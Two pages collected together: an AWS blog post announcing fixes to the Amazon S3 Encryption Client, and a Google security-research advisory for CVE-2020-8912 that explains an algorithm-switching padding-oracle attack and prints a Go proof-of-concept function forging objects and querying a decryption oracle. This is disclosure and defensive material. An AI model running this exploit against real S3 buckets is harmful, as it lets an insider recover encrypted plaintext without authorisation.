=== Content from aws.amazon.com_387ce83d_20250119_111630.html ===


 [Skip to Main Content](#aws-page-content-main)
[Click here to return to Amazon Web Services homepage](https://aws.amazon.com/?nc2=h_lg)

[About AWS](https://aws.amazon.com/about-aws/?nc2=h_header)
[Contact Us](https://aws.amazon.com/contact-us/?nc2=h_header)
Support
English
My Account
 [Sign In](https://console.aws.amazon.com/console/home?nc2=h_ct&src=header-signin)

 [Create an AWS Account](https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc2=h_ct&src=header_signup)

* [Amazon Q](https://aws.amazon.com/q/?nc2=h_ql_prod_l1_q)
* [Products](https://aws.amazon.com/products/?nc2=h_ql_prod)
* [Solutions](https://aws.amazon.com/solutions/?nc2=h_ql_sol)
* [Pricing](https://aws.amazon.com/pricing/?nc2=h_ql_pr)
* [Documentation](https://aws.amazon.com/documentation-overview/?nc2=h_ql_doc_do)
* [Learn](https://aws.amazon.com/getting-started/?nc2=h_ql_le)
* [Partner Network](https://aws.amazon.com/partners/?nc2=h_ql_pn)
* [AWS Marketplace](https://aws.amazon.com/marketplace/?nc2=h_ql_mp)
* [Customer Enablement](https://aws.amazon.com/customer-enablement/?nc2=h_ql_ce)
* [Events](https://aws.amazon.com/events/?nc2=h_ql_ev)
* [Explore More](https://aws.amazon.com/contact-us/?nc2=h_ql_exm)

Close

* [عربي](https://aws.amazon.com/ar/?nc1=h_ls)
* [Bahasa Indonesia](https://aws.amazon.com/id/?nc1=h_ls)
* [Deutsch](https://aws.amazon.com/de/?nc1=h_ls)
* [English](https://aws.amazon.com/?nc1=h_ls)
* [Español](https://aws.amazon.com/es/?nc1=h_ls)
* [Français](https://aws.amazon.com/fr/?nc1=h_ls)
* [Italiano](https://aws.amazon.com/it/?nc1=h_ls)
* [Português](https://aws.amazon.com/pt/?nc1=h_ls)

* [Tiếng Việt](https://aws.amazon.com/vi/?nc1=f_ls)
* [Türkçe](https://aws.amazon.com/tr/?nc1=h_ls)
* [Ρусский](https://aws.amazon.com/ru/?nc1=h_ls)
* [ไทย](https://aws.amazon.com/th/?nc1=f_ls)
* [日本語](https://aws.amazon.com/jp/?nc1=h_ls)
* [한국어](https://aws.amazon.com/ko/?nc1=h_ls)
* [中文 (简体)](https://aws.amazon.com/cn/?nc1=h_ls)
* [中文 (繁體)](https://aws.amazon.com/tw/?nc1=h_ls)

Close

* [My Profile](https://aws.amazon.com/profile/?nc2=h_m_mc)
* [Sign out of AWS Builder ID](https://auth.aws.amazon.com/sign-out/?nc2=h_m_mc)
* [AWS Management Console](https://console.aws.amazon.com/?nc2=h_m_mc)
* [Account Settings](https://console.aws.amazon.com/billing/home#/account?nc2=h_m_ma)
* [Billing & Cost Management](https://console.aws.amazon.com/billing/home?nc2=h_m_bc)
* [Security Credentials](https://console.aws.amazon.com/iam/home?nc2=h_m_sc#security_credential)
* [AWS Personal Health Dashboard](https://phd.aws.amazon.com/?nc2=h_m_sc)

Close

* [Support Center](https://console.aws.amazon.com/support/home/?nc2=h_ql_cu)
* [Expert Help](https://iq.aws.amazon.com/?utm=mkt.nav)
* [Knowledge Center](https://repost.aws/knowledge-center/?nc2=h_m_ma)
* [AWS Support Overview](https://aws.amazon.com/premiumsupport/?nc2=h_m_bc)
* [AWS re:Post](https://repost.aws/)

[Click here to return to Amazon Web Services homepage](https://aws.amazon.com/?nc2=h_lg)

 [Get Started for Free](https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc2=h_mobile)

 [Contact Us](https://aws.amazon.com/contact-us/?nc2=h_mobile)

* [Products](https://aws.amazon.com/products/?nc2=h_mo)
* [Solutions](https://aws.amazon.com/solutions/?nc2=h_mo)
* [Pricing](https://aws.amazon.com/pricing/?nc2=h_mo)
* [Introduction to AWS](https://aws.amazon.com/what-is-aws/?nc2=h_mo)
* [Getting Started](https://aws.amazon.com/getting-started/?nc2=h_mo)
* [Documentation](https://aws.amazon.com/documentation-overview/?nc2=h_mo)
* [Training and Certification](https://aws.amazon.com/training/?nc2=h_mo)
* [Developer Center](https://aws.amazon.com/developer/?nc2=h_mo)
* [Customer Success](https://aws.amazon.com/solutions/case-studies/?nc2=h_mo)
* [Partner Network](https://aws.amazon.com/partners/?nc2=h_mo)
* [AWS Marketplace](https://aws.amazon.com/marketplace/?nc2=h_mo)
* [Support](https://console.aws.amazon.com/support/home?nc2=h_ql_cu)
* [AWS re:Post](https://repost.aws/)
* [Log into Console](https://console.aws.amazon.com/console/home)
* [Download the Mobile App](https://aws.amazon.com/console/mobile/)

 [AWS Blog Home](/blogs)
Blogs
Editions

Close
 [Architecture](https://aws.amazon.com/blogs/architecture/)
 [AWS Cloud Operations](https://aws.amazon.com/blogs/mt/)
 [AWS for Games](https://aws.amazon.com/blogs/gametech/)
 [AWS Insights](https://aws.amazon.com/blogs/aws-insights/)
 [AWS Marketplace](https://aws.amazon.com/blogs/awsmarketplace/)
 [AWS News](https://aws.amazon.com/blogs/aws/)
 [AWS Partner Network](https://aws.amazon.com/blogs/apn/)
 [AWS Smart Business](https://aws.amazon.com/blogs/smb/)
 [Big Data](https://aws.amazon.com/blogs/big-data/)
 [Business Intelligence](https://aws.amazon.com/blogs/business-intelligence/)
 [Business Productivity](https://aws.amazon.com/blogs/business-productivity/)
 [Cloud Enterprise Strategy](https://aws.amazon.com/blogs/enterprise-strategy/)
 [Cloud Financial Management](https://aws.amazon.com/blogs/aws-cloud-financial-management/)
 [Compute](https://aws.amazon.com/blogs/compute/)
 [Contact Center](https://aws.amazon.com/blogs/contact-center/)
 [Containers](https://aws.amazon.com/blogs/containers/)
 [Database](https://aws.amazon.com/blogs/database/)
 [Desktop & Application Streaming](https://aws.amazon.com/blogs/desktop-and-application-streaming/)
 [Developer Tools](https://aws.amazon.com/blogs/developer/)
 [DevOps & Developer Productivity](https://aws.amazon.com/blogs/devops/)
 [Front-End Web & Mobile](https://aws.amazon.com/blogs/mobile/)

 [HPC](https://aws.amazon.com/blogs/hpc/)
 [IBM and Red Hat](https://aws.amazon.com/blogs/ibm-redhat/)
 [Industries](https://aws.amazon.com/blogs/industries/)
 [Integration & Automation](https://aws.amazon.com/blogs/infrastructure-and-automation/)
 [Internet of Things](https://aws.amazon.com/blogs/iot/)
 [Machine Learning](https://aws.amazon.com/blogs/machine-learning/)
 [Media](https://aws.amazon.com/blogs/media/)
 [Messaging & Targeting](https://aws.amazon.com/blogs/messaging-and-targeting/)
 [Microsoft Workloads on AWS](https://aws.amazon.com/blogs/modernizing-with-aws/)
 [Migration and Modernization](https://aws.amazon.com/blogs/migration-and-modernization/)
 [.NET on AWS](https://aws.amazon.com/blogs/dotnet/)
 [Networking & Content Delivery](https://aws.amazon.com/blogs/networking-and-content-delivery/)
 [Open Source](https://aws.amazon.com/blogs/opensource/)
 [Public Sector](https://aws.amazon.com/blogs/publicsector/)
 [Quantum Computing](https://aws.amazon.com/blogs/quantum-computing/)
 [Robotics](https://aws.amazon.com/blogs/robotics/)
 [SAP](https://aws.amazon.com/blogs/awsforsap/)
 [Security](https://aws.amazon.com/security/blogs/)
 [Spatial Computing](https://aws.amazon.com/blogs/spatial/)
 [Startups](https://aws.amazon.com/blogs/startups/)
 [Storage](https://aws.amazon.com/blogs/storage/)
 [Supply Chain & Logistics](https://aws.amazon.com/blogs/supply-chain/)
 [Training & Certification](https://aws.amazon.com/blogs/training-and-certification/)

Close

* [中国版](https://aws.amazon.com/cn/blogs/china/)
* [日本版](https://aws.amazon.com/jp/blogs/news/)
* [한국 에디션](https://aws.amazon.com/ko/blogs/korea/)
* [기술 블로그](https://aws.amazon.com/ko/blogs/tech/)
* [Edisi Bahasa Indonesia](https://aws.amazon.com/id/blogs/indonesia/)
* [AWS Thai Blog](https://aws.amazon.com/th/blogs/thailand/)
* [Édition Française](https://aws.amazon.com/fr/blogs/france/)
* [Deutsche Edition](https://aws.amazon.com/de/blogs/germany/)
* [Edição em Português](https://aws.amazon.com/pt/blogs/aws-brasil/)
* [Edición en Español](https://aws.amazon.com/es/blogs/aws-spanish/)
* [Версия на русском](https://aws.amazon.com/ru/blogs/rus/)
* [Türkçe Sürüm](https://aws.amazon.com/tr/blogs/turkey/)

## [AWS Developer Tools Blog](https://aws.amazon.com/blogs/developer/)

# Updates to the Amazon S3 Encryption Client

by Colm MacCarthaigh
on 07 AUG 2020
[Permalink](https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/)
Share

The [Amazon S3 Encryption Client](https://docs.aws.amazon.com/general/latest/gr/aws_sdk_cryptography.html) is a convenient and efficient tool for performing client-side encryption of objects in S3. One of the unique propositions of client-side encryption is that if you are willing and able to do all of your own key management then you, and only you, will have access to the unencrypted or “plaintext” material should all of your other access controls fail. Historically, client-side encryption has allowed customers in security sensitive and regulated sectors to use cloud storage, such as S3, before a storage service was certified by their regulators or security auditors, since the service would only have access to the encrypted content.

While client-side encryption still has an important role in security and data protection, two of its disadvantages are that it depends on clients having a secure source of randomness, which is not always easy, and it is CPU intensive on the client. For more simplicity and efficiency, our services also offer server-side encryption. Amazon S3 supports three options for server-side encryption.

One option is for S3 to fully manage the encryption keys (SSE-S3). This option places the most trust in AWS.  With security initiatives such as the Amazon Nitro security system, Amazon s2n, and our relentless internal security work, we’ve demonstrated to customers and regulators that Amazon S3 is appropriate for use in highly sensitive environments.

Another option is for the customer to provide the key, but have S3 perform the actual encryption and decryption (SSE-C). This gives customers a level of separation between themselves and AWS that is similar to client-side encryption; there’s a small window where the encryption key will be present on AWS secure servers, but our CPUs do the work of encryption and decryption “in-place” where the data resides.

A third option is for customers to use a key that is managed by the Amazon Key Management Service (KMS) (SSE-KMS). This option, built with hardware-based security in AWS KMS, gives customers control and transparency over access to their keys with strong auditing. AWS KMS lets customers grant specific AWS services the ability to decrypt the underlying data to do work on the customer’s behalf.

Going back to client-side encryption, today we’re making updates to the Amazon S3 Encryption Client in the AWS SDKs. The updates add fixes for two issues in the AWS C++ SDK that the AWS Cryptography team discovered, and for three issues that were discovered and reported by Sophie Schmieg, from Google’s ISE team. The issues are interesting finds, and they mirror issues that have been discovered in other cryptographic designs (including SSL!), but they also all require a privileged level of access, such as write access to an S3 bucket and the ability to observe whether a decryption operation has succeeded or not. These issues do not impact S3 server-side encryption, or S3’s SSL/TLS encryption, which also protects these issues from any network threats.

The first update addresses an issue where older versions of the S3 Encryption Client include an unencrypted MD5 hash of the plaintext as part of an encrypted object’s meta-data. For well-known objects, or for extremely small objects that may be subject to a brute-force attack, this hash may allow an attacker to reveal the contents of the encrypted object. Only a user with read-access to the S3 object could have had access to the hash. This issue owes its history to the S3 “ETag,” which is a content fingerprint used by HTTP servers and caches to determine if some content has changed. Maintaining a hash of the plaintext allowed synchronization tools to confirm that the content had not changed as it was encrypted. In addition to removing this capability in the updated S3 Encryption Client, we’ve also removed the custom hashes generated by older versions of the S3 Encryption Client from S3 object read responses.

The second update addresses an issue where older versions of the S3 Encryption Client support “CBC” mode encryption, but without a message authentication code (MAC) that checks the ciphertext prior to decryption. This leads to a padding issue that is similar to issues found in SSL/TLS. To use this issue as part of a security attack, an attacker would need the ability to upload or modify objects, and also to observe whether or not a target has successfully decrypted an object. By observing those attempts, an attacker could gradually learn the value of encrypted content, one byte at a time and at a cost of 128 attempts per byte.

The S3 Encryption Client supports AES-GCM for encryption, which is not impacted by this issue. In older versions, we continued to support AES-CBC for some programming languages and families where AES-GCM was not performant. As AES-GCM is now supported and performant in all modern runtimes and languages, we’re removing AES-CBC as an option for encrypting new objects.

The third update addresses an issue where the encryption format specifies the type of encryption to be used, but does not sign or authenticate that instruction. This issue is very hard to abuse, but it means that an attacker who has write access to an object can theoretically modify it to specify a different content encryption algorithm than was actually used. When a decryption is attempted using the “wrong” algorithm, if the decryption succeeds, that may reveal details of up to 16 bytes of the underlying data, but it also takes some educated guesswork about what the data may be. As with issue two, this issue also requires that an attacker be able to observe whether or not a decryption succeeded. To address this issue, the updated S3 Encryption Client will validate the content encryption algorithm during decryption.

The remaining updates are related to specific issues that the AWS Cryptography team identified in the AWS C++ SDK. We’ve updated the AWS C++ SDK’s implementation of the AES-GCM encryption algorithm to correctly validate the GCM tag. Prior to this update, someone with sufficient access to modify the encrypted data could corrupt or alter the plaintext data, and that the change would survive decryption. This would succeed if the C++ SDK is being used to decrypt data; our other SDKs would detect the alteration. This sort of issue was one of the design considerations behind “[SCRAM](https://github.com/awslabs/s2n/tree/master/scram)”, an encryption mode we released earlier this year that cryptographically prevents errors like this. We may use SCRAM in future versions of our encryption formats, but for now we’ve made the backwards-compatible change to have the AWS C++ SDK detect any alterations.

The other update, also for an issue identified by the AWS Cryptography team, is to correct the length checks in the C++ SDK. When using AES-CBC, the C++ SDK had an insufficient check on the length of the Initialization Vector (IV) used. The IV is random data that is provided to make the encryption secure. The check was correct for AES-GCM, but incorrect for AES-CBC. We found similar behavior when attempting to read an object with a content wrapping key smaller than 32 bytes (256-bits). Neither issue affects the security of the encryption or decryption, but it did mean that the C++ SDK could crash if the initialization vector or wrapping key wasn’t long enough.

In addition to updates for these issues, we have added new alerts to identify attempts to use encryption without robust integrity checks. We have also added additional interoperability testing, regression tests, and validation to all updated S3 Encryption Client implementations.

The updated SDKs can decrypt objects encrypted with previous versions, however the previous versions will not be able to decrypt objects encrypted by the new version because of the format change required to address the third issue.

For more detailed migration instructions for each SDK and additional information on S3 Encryption Client please see the migration guides linked below:

* [Java Migration Guide](https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/s3-encryption-migration.html)
* [.NET Migration Guide](https://docs.aws.amazon.com/sdk-for-net/latest/developer-guide/s3-encryption-migration.html)
* [Go Migration Guide](https://docs.aws.amazon.com/sdk-for-go/v1/developer-guide/s3-encryption-migration.html)
* [Ruby Migration Guide](https://docs.aws.amazon.com/sdk-for-ruby/v3/developer-guide/s3-encryption-migration.html)
* [C++ Migration Guide](https://docs.aws.amazon.com/sdk-for-cpp/v1/developer-guide/s3-encryption-migration.html)
* [PHP Migration Guide](https://docs.aws.amazon.com/sdk-for-php/v3/developer-guide/s3-encryption-migration.html)

As mentioned above, these issues do not impact S3’s server-side encryption, or S3’s TLS/SSL encryption for data in transit.

Whether security researcher or customer, we are always open to feedback on where we can make improvements across AWS services or tooling—security-related concerns can be reported to AWS Security via aws-security@amazon.com. As ever, we’re grateful for security research and want to thank Sophie for reporting these issues she did. Updated versions of the S3 Encryption Client are now available for download.

### Resources

 [Developer Resources & Community](https://aws.amazon.com/developer?sc_ichannel=ha&sc_icampaign=acq_awsblogsb&sc_icontent=developer-resources)
 [Open Source Repos](https://aws.github.io/)
 [Twitch Live Coding](https://aws.amazon.com/twitch?sc_ichannel=ha&sc_icampaign=acq_awsblogsb&sc_icontent=developer-resources)
 [Labs on Github](https://github.com/awslabs)

---

### Follow

 [Instagram](https://www.instagram.com/awsdevelopers)
 [Reddit](https://www.reddit.com/user/AmazonWebServices)
 [Twitter](https://twitter.com/awscloud)
 [Facebook](https://www.facebook.com/amazonwebservices)
 [LinkedIn](https://www.linkedin.com/company/amazon-web-services/)
 [Twitch](https://www.twitch.tv/aws)
 [Email Updates](https://pages.awscloud.com/communication-preferences?sc_ichannel=ha&sc_icampaign=acq_awsblogsb&sc_icontent=developer-social)

 [Sign In to the Console](https://console.aws.amazon.com/console/home?nc1=f_ct&src=footer-signin-mobile)
### Learn About AWS

* [What Is AWS?](https://aws.amazon.com/what-is-aws/?nc1=f_cc)
* [What Is Cloud Computing?](https://aws.amazon.com/what-is-cloud-computing/?nc1=f_cc)
* [AWS Accessibility](https://aws.amazon.com/accessibility/?nc1=f_cc)
* [AWS Inclusion, Diversity & Equity](https://aws.amazon.com/diversity-inclusion/?nc1=f_cc)
* [What Is DevOps?](https://aws.amazon.com/devops/what-is-devops/?nc1=f_cc)
* [What Is a Container?](https://aws.amazon.com/containers/?nc1=f_cc)
* [What Is a Data Lake?](https://aws.amazon.com/what-is/data-lake/?nc1=f_cc)
* [What is Artificial Intelligence (AI)?](https://aws.amazon.com/what-is/artificial-intelligence/?nc1=f_cc)
* [What is Generative AI?](https://aws.amazon.com/what-is/generative-ai/?nc1=f_cc)
* [What is Machine Learning (ML)?](https://aws.amazon.com/what-is/machine-learning/?nc1=f_cc)
* [AWS Cloud Security](https://aws.amazon.com/security/?nc1=f_cc)
* [What's New](https://aws.amazon.com/new/?nc1=f_cc)
* [Blogs](https://aws.amazon.com/blogs/?nc1=f_cc)
* [Press Releases](https://press.aboutamazon.com/press-releases/aws "Press Releases")

### Resources for AWS

* [Getting Started](https://aws.amazon.com/getting-started/?nc1=f_cc)
* [Training and Certification](https://aws.amazon.com/training/?nc1=f_cc)
* [AWS Solutions Library](https://aws.amazon.com/solutions/?nc1=f_cc)
* [Architecture Center](https://aws.amazon.com/architecture/?nc1=f_cc)
* [Product and Technical FAQs](https://aws.amazon.com/faqs/?nc1=f_dr)
* [Analyst Reports](https://aws.amazon.com/resources/analyst-reports/?nc1=f_cc)
* [AWS Partners](https://aws.amazon.com/partners/work-with-partners/?nc1=f_dr)

### Developers on AWS

* [Developer Center](https://aws.amazon.com/developer/?nc1=f_dr)
* [SDKs & Tools](https://aws.amazon.com/developer/tools/?nc1=f_dr)
* [.NET on AWS](https://aws.amazon.com/developer/language/net/?nc1=f_dr)
* [Python on AWS](https://aws.amazon.com/developer/language/python/?nc1=f_dr)
* [Java on AWS](https://aws.amazon.com/developer/language/java/?nc1=f_dr)
* [PHP on AWS](https://aws.amazon.com/developer/language/php/?nc1=f_cc)
* [JavaScript on AWS](https://aws.amazon.com/developer/language/javascript/?nc1=f_dr)

### Help

* [Contact Us](https://aws.amazon.com/contact-us/?nc1=f_m)
* [Get Expert Help](https://iq.aws.amazon.com/?utm=mkt.foot/?nc1=f_m)
* [File a Support Ticket](https://console.aws.amazon.com/support/home/?nc1=f_dr)
* [AWS re:Post](https://repost.aws/?nc1=f_dr)
* [Knowledge Center](https://repost.aws/knowledge-center/?nc1=f_dr)
* [AWS Support Overview](https://aws.amazon.com/premiumsupport/?nc1=f_dr)
* [Legal](https://aws.amazon.com/legal/?nc1=f_cc)
* [AWS Careers](https://aws.amazon.com/careers/)

 [Create an AWS Account](https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc1=f_ct&src=default)

Amazon is an Equal Opportunity Employer:
 *Minority / Women / Disability / Veteran / Gender Identity / Sexual Orientation / Age.*

* Language
* [عربي](https://aws.amazon.com/ar/?nc1=h_ls)
* [Bahasa Indonesia](https://aws.amazon.com/id/?nc1=h_ls)
* [Deutsch](https://aws.amazon.com/de/?nc1=h_ls)
* [English](https://aws.amazon.com/?nc1=h_ls)
* [Español](https://aws.amazon.com/es/?nc1=h_ls)
* [Français](https://aws.amazon.com/fr/?nc1=h_ls)
* [Italiano](https://aws.amazon.com/it/?nc1=h_ls)
* [Português](https://aws.amazon.com/pt/?nc1=h_ls)
* [Tiếng Việt](https://aws.amazon.com/vi/?nc1=f_ls)
* [Türkçe](https://aws.amazon.com/tr/?nc1=h_ls)
* [Ρусский](https://aws.amazon.com/ru/?nc1=h_ls)
* [ไทย](https://aws.amazon.com/th/?nc1=f_ls)
* [日本語](https://aws.amazon.com/jp/?nc1=h_ls)
* [한국어](https://aws.amazon.com/ko/?nc1=h_ls)
* [中文 (简体)](https://aws.amazon.com/cn/?nc1=h_ls)
* [中文 (繁體)](https://aws.amazon.com/tw/?nc1=h_ls)

* [Privacy](https://aws.amazon.com/privacy/?nc1=f_pr)
* |
* [Accessibility](https://aws.amazon.com/accessibility/?nc1=f_acc)
* |
* [Site Terms](https://aws.amazon.com/terms/?nc1=f_pr)
* |
* Cookie Preferences
* |
* © 2024, Amazon Web Services, Inc. or its affiliates. All rights reserved.



=== Content from github.com_86802c94_20250119_111631.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fsecurity%2Fadvisories%2FGHSA-7f33-f4f5-xwgw)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgoogle%2Fsecurity-research%2Fsecurity%2Fadvisories%2FGHSA-7f33-f4f5-xwgw)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=google%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[google](/google)
/
**[security-research](/google/security-research)**
Public

* [Notifications](/login?return_to=%2Fgoogle%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  424](/login?return_to=%2Fgoogle%2Fsecurity-research)
* [Star
   3.5k](/login?return_to=%2Fgoogle%2Fsecurity-research)

* [Code](/google/security-research)
* [Issues
  8](/google/security-research/issues)
* [Pull requests
  14](/google/security-research/pulls)
* [Actions](/google/security-research/actions)
* [Security](/google/security-research/security)
* [Insights](/google/security-research/pulse)

Additional navigation options

* [Code](/google/security-research)
* [Issues](/google/security-research/issues)
* [Pull requests](/google/security-research/pulls)
* [Actions](/google/security-research/actions)
* [Security](/google/security-research/security)
* [Insights](/google/security-research/pulse)

# AWS: In-band key negotiation issue in the AWS S3 Crypto SDK for golang

Low

[u269c](/u269c)
published
GHSA-7f33-f4f5-xwgw
Aug 10, 2020

## Package

AWS S3 crypto SDK (aws-sdk-go/service/s3/s3crypto)

## Affected versions

V1

## Patched versions

V2

## Description

### Summary

The golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the GCM option was chosen as content cipher.

### Risk/Severity

The vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.

### Impact

This advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non "strict" versions of C++ and Java S3 Crypto SDKs being present as well.

V1 of the S3 crypto SDK does not authenticate the algorithm parameters for the data encryption key.

An attacker with write access to the bucket can use this in order to change the encryption algorithm of an object in the bucket, which can lead to problems depending on the supported algorithms. For example, a switch from AES-GCM to AES-CTR in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation.

By default, the only available algorithms in the SDK are AES-GCM and AES-CBC. Switching the algorithm from AES-GCM to AES-CBC can be used as way to reconstruct the plaintext through an oracle endpoint revealing decryption failures, by brute forcing 16 byte chunks of the plaintext. Note that the plaintext needs to have some known structure for this to work, as a uniform random 16 byte string would be the same as a 128 bit encryption key, which is considered cryptographically safe.

The attack works by taking a 16 byte AES-GCM encrypted block guessing 16 bytes of plaintext, constructing forgery that pretends to be PKCS5 padded AES-CBC, using the ciphertext and the plaintext guess and that will decrypt to a valid message if the guess was correct.

To understand this attack, we have to take a closer look at both AES-GCM and AES-CBC:

AES-GCM encrypts using a variant of CTR mode, i.e. `C_i = AES-Enc(CB_i) ^ M_i`. AES-CBC on the other hand *decrypts* via `M_i = AES-Dec(C_i) ^ C_{i-1}`, where `C_{-1} = IV`. The padding oracle can tell us if, after switching to CBC mode, the plaintext recovered is padded with a valid PKCS5 padding.

Since `AES-Dec(C_i ^ M_i) = CB_i`, if we set `IV' = CB_i ^ 0x10*[16]`, where `0x10*[16]` is the byte `0x10` repeated 16 times, and `C_0' = C_i ^ M_i'` the resulting one block message `(IV', C_0')` will have valid PKCS5 padding if our guess `M_i'` for `M_i` was correct, since the decrypted message consists of 16 bytes of value `0x10`, the PKCS5 padded empty string.

Note however, that an incorrect guess might also result in a valid padding, if the AES decryption result randomly happens to end in `0x01`, `0x0202`, or a longer valid padding. In order to ensure that the guess was indeed correct, a second check using `IV'' = IV' ^ (0x00*[15] || 0x11)` with the same ciphertext block has to be performed. This will decrypt to 15 bytes of value `0x10` and one byte of value `0x01` if our initial guess was correct, producing a valid padding. On an incorrect guess, this second ciphertext forgery will have an invalid padding with a probability of 1:2^128, as one can easily see.

This issue is fixed in V2 of the API, by using the `KMS+context` key wrapping scheme for new files, authenticating the algorithm. Old files encrypted with the `KMS` key wrapping scheme remain vulnerable until they are reencrypted with the new scheme.

### Mitigation

Using the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with GCM mode and use the `KMS` key wrapping option.

### Proof of concept

A [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.

This particular issue is described in [combined\_oracle\_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/combined_oracle_exploit.go):

```
func CombinedOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {
	data, header, err := input.S3Mock.GetObjectDirect(bucket, key)
	if alg := header.Get("X-Amz-Meta-X-Amz-Cek-Alg"); alg != "AES/GCM/NoPadding" {
		return "", fmt.Errorf("Algorithm is %q, not GCM!", alg)
	}
	gcmIv, err := base64.StdEncoding.DecodeString(header.Get("X-Amz-Meta-X-Amz-Iv"))
	if len(gcmIv) != 12 {
		return "", fmt.Errorf("GCM IV is %d bytes, not 12", len(gcmIv))
	}
	fullIv := make([]byte, 16)
	confirmIv := make([]byte, 16)
	for i := 0; i < 12; i++ {
		fullIv[i] = gcmIv[i] ^ 0x10
		confirmIv[i] = gcmIv[i] ^ 0x10
	}
        // Set i to the block we want to attempt to decrypt
	counter := i + 2
	for j := 15; j >= 12; j-- {
		v := byte(counter % 256)
		fullIv[j] = 0x10 ^ v
		confirmIv[j] = 0x10 ^ v
		counter /= 256
	}
	confirmIv[15] ^= 0x11
	fullIvEnc := base64.StdEncoding.EncodeToString(fullIv)
	confirmIvEnc := base64.StdEncoding.EncodeToString(confirmIv)
	success := false
        // Set plaintextGuess to the guess for the plaintext of this block
	newData := []byte(plaintextGuess)
	for j := 0; j < 16; j++ {
		newData[j] ^= data[16*i+j]
	}
	newHeader := header.Clone()
	newHeader.Set("X-Amz-Meta-X-Amz-Cek-Alg", "AES/CBC/PKCS5Padding")
	newHeader.Set("X-Amz-Meta-X-Amz-Iv", fullIvEnc)
	newHeader.Set("X-Amz-Meta-X-Amz-Unencrypted-Content-Length", "16")
	input.S3Mock.PutObjectDirect(bucket, key+"guess", newData, newHeader)
	if input.Oracle(bucket, key+"guess") {
		newHeader.Set("X-Amz-Meta-X-Amz-Iv", confirmIvEnc)
		input.S3Mock.PutObjectDirect(bucket, key+"guess", newData, newHeader)
		if input.Oracle(bucket, key+"guess") {
			return plaintextGuess, nil
		}
	}
	return "", fmt.Errorf("Block %d could not be decrypted", i)
}
```

### Severity

Low

### CVE ID

CVE-2020-8912

### Weaknesses

No CWEs

### Credits

* [![@sophieschmieg](https://avatars.githubusercontent.com/u/53278002?s=40&v=4)](/sophieschmieg)
  [sophieschmieg](/sophieschmieg)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

